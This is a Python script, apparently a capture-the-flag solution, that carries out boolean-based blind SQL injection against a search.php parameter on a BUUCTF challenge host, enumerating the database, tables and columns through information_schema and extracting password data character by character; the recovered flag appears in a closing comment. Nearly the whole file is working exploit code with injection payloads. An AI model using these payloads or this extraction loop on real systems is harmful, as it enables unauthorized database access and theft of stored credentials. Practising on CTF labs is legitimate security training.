import requests
import time
url="http://b9549488-6383-42c1-ad2b-6fb3835b92d5.node5.buuoj.cn:81/search.php?id=1"
def db_length():
    for i in range(0,10):
        payload=url+"1^(length(database())="+str(i)+")--+"
        resp=requests.get(payload)
        if "ERROR" in resp.text:
            print(f"数据库长度为{i}")
            return i

def de_name(len):
    db_name=""
    for i in range(1,len+1):
        max=127
        min=0
        for j in range(0,127):
            mid=int((max+min)/2)
            payload=url+"1^(ascii(substr(database(),"+str(i)+",1))>"+str(mid)+")--+"
            resp=requests.get(payload)
            if "ERROR" in resp.text:
                min=mid
            else:
                max=mid
            if max-min<=1:
                db_name+=chr(max)
                break
    return db_name

def get_tblen():
    for i in range(1,30):
        payload=url+"1^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'))="+str(i)+")--+"
        resp=requests.get(payload)
        if "ERROR" in resp.text:
            return i

def get_tbname(len):
    tb_name = ""
    for i in range(1, len + 1):
        max = 127
        min = 0
        for j in range(0, 127):
            mid = int((max + min) / 2)
            payload = url + "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),"+str(i)+",1))>"+str(mid)+")--+"
            resp = requests.get(payload)
            time.sleep(0.05)
            if "ERROR" in resp.text:
                min = mid
            else:
                max = mid
            if max - min <= 1:
                tb_name += chr(max)
                #print(tb_name)
                break
    return tb_name

def co_len():
    for i in range(1,20):
        payload=url+"1^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name)='Flaaaaag'))="+str(i)+")--+"
        resp=requests.get(payload)
        if "ERROR" in resp.text:
            return i

def get_coname(len):
    co_name=""
    for i in range(1, len + 1):
        max = 127
        min = 0
        for j in range(0, 127):
            mid = int((max + min) / 2)
            payload = url + "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='Flaaaaag'),"+str(i)+",1))>"+str(mid)+")--+"
            resp = requests.get(payload)
            time.sleep(0.05)
            if "ERROR" in resp.text:
                min = mid
            else:
                max = mid
            if max - min <= 1:
                co_name += chr(max)
                #print(tb_name)
                break
    return co_name

def get_len():
    for i in range(1,50):
        payload=url+"1^(length((select(group_concat(password))from(F1naI1y)))="+str(i)+")--+"
        resp = requests.get(payload)
        if "ERROR" in resp.text:
            return i

def get_flag():
    flag=""
    for i in range(1, 1000):
        max = 127
        min = 0
        for j in range(0, 127):
            mid = int((max + min) / 2)
            payload = url + "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),"+str(i)+",1))>"+str(mid)+")--+"
            resp = requests.get(payload)
            time.sleep(0.05)
            if "ERROR" in resp.text:
                min = mid
            else:
                max = mid
            if max - min <= 1:
                flag += chr(max)
                print(flag)
                break
    return flag

def main():
    db_len=db_length()
    db_name=de_name(db_len)
    print("数据库名称为:",db_name)
    tb_len=get_tblen()
    print("数据库中表的长度为",tb_len)
    tb_name=get_tbname(tb_len)
    print("表名:",tb_name)
    col_len=co_len()
    print("字段长度:",col_len)
    co_name=get_coname(col_len)
    print("字段名:",co_name)
    get_flag()

if __name__=='__main__':
    main()

#flag藏在这里
#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag{863bee8f-abf4-49d3-aa11-e27a8c920b4e}
